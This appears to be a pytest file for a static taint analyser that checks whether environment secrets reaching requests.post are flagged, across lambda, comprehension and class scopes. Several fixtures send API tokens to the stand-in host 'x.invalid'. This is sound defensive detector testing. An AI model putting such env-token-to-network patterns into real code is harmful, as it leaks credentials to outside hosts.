class TestLambdaAndComprehensionScopes:
    """Lambdas and comprehensions are scopes of their own, as in Python 3."""

    def test_walrus_inside_a_lambda_does_not_shadow_a_global(self) -> None:
        code = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            def send():
                reset = lambda: (TOKEN := None)
                requests.post("https://x.invalid", data=TOKEN)  # SINK
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_walrus_inside_a_comprehension_binds_in_the_function(self) -> None:
        code = _code(
            """
            import os, requests
            TOKEN = os.getenv("API_TOKEN")
            def send():
                [(TOKEN := "public") for _ in range(1)]
                requests.post("https://x.invalid", data=TOKEN)
            """
        )
        assert _summary(code) == []

    def test_lambda_assigned_to_a_name_binds_call_arguments(self) -> None:
        code = _code(
            """
            import os, requests
            post_secret = lambda payload: requests.post("https://x.invalid", data=payload)  # SINK
            def main():
                value = os.getenv("API_TOKEN")
                post_secret(value)
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]

    def test_lambda_parameters_are_local(self) -> None:
        code = _code(
            """
            import os, requests
            payload = os.getenv("API_TOKEN")
            send = lambda payload: requests.post("https://x.invalid", data=payload)
            send("public")
            """
        )
        assert _summary(code) == []

    def test_comprehension_targets_are_local(self) -> None:
        into_callee = _code(
            """
            import os, requests
            url = os.getenv("WEBHOOK_URL")
            def ping(u):
                requests.get(u, timeout=5)
            def check(urls):
                return [ping(url) for url in urls]
            """
        )
        direct_sink = _code(
            """
            import os, requests
            url = os.getenv("WEBHOOK_URL")
            def check(urls):
                return [requests.get(url, timeout=5) for url in urls]
            """
        )
        outer_name = _code(
            """
            import os, requests
            token = os.getenv("API_TOKEN")
            def send():
                labels = [token for token in ("a", "b")]
                requests.post("https://x.invalid", data=token)  # SINK
            """
        )
        assert _summary(into_callee) == []
        assert _summary(direct_sink) == []
        assert _summary(outer_name) == [("TT3", _line(outer_name, "# SINK"))]

    def test_comprehension_over_tainted_data_taints_its_target(self) -> None:
        code = _code(
            """
            import os, requests
            def send(names):
                secrets = [os.getenv(name) for name in names]
                for value in [s for s in secrets]:
                    pass
                [requests.post("https://x.invalid", data=s) for s in secrets]  # SINK
            """
        )
        assert _summary(code) == [("TT3", _line(code, "# SINK"))]


class TestRecallAndPrecisionPaths:
    """Each path below is pinned so that removing it fails a test."""

    def test_recall_paths(self) -> None:
        cases = (
            # keyword-only defaults
            """
            import os, requests
            def send(*, value=os.getenv("API_KEY")):
                requests.post("https://x.invalid", data=value)  # SINK
            send()
            """,
            # Thread kwargs
            """
            import os, requests, threading
            def upload(body):
                requests.post("https://x.invalid", data=body)  # SINK
            def main():
                secret = os.getenv("API_KEY")
                threading.Thread(target=upload, kwargs={"body": secret}).start()
            """,
            # class attribute read through the class name
            """
            import os, requests
            class Config:
                TOKEN = os.getenv("API_TOKEN")
            def send():
                requests.post("https://x.invalid", data=Config.TOKEN)  # SINK
            """,
            # defaults are evaluated in the defining class body
            """
            import os, requests
            class Client:
                TOKEN = os.getenv("API_TOKEN")
                def send(self, token=TOKEN):
                    requests.post("https://x.invalid", data=token)  # SINK
            """,
        )
        for case in cases:
            code = _code(case)
            assert _summary(code) == [("TT3", _line(code, "# SINK"))], case

    def test_precision_guards(self) -> None:
        cases = (
            # an untyped receiver never reads a same-named module method's return
            """
            import os, requests
            class Settings:
                def get(self, name):
                    return os.getenv(name)
            def fetch(params):
                url = params.get("url")
                return requests.get(url)
            """,
            # a library-typed receiver does not bind into a same-named module method
            """
            import os, requests
            class Api:
                def get(self, url):
                    requests.get(url)
            def main():
                token = os.getenv("API_TOKEN")
                session = requests.Session()
                session.get(token)
            """,
            # class-body names are not visible to methods
            """
            import os, requests
            token = "public"
            class Client:
                token = os.getenv("API_TOKEN")
                def send(self):
                    requests.post("https://x.invalid", data=token)
            """,
            # an explicit dunder call on an unknown object binds nowhere
            """
            import os, requests
            class Auth:
                def __init__(self, token):
                    self.token = token
            def make(auth):
                auth.__init__(os.getenv("GITHUB_TOKEN"))
            class Downloader:
                def __init__(self, url):
                    self.url = url
                def fetch(self):
                    return requests.get(self.url, timeout=10)
            """,
        )
        for case in cases:
            assert _summary(_code(case)) == [], case
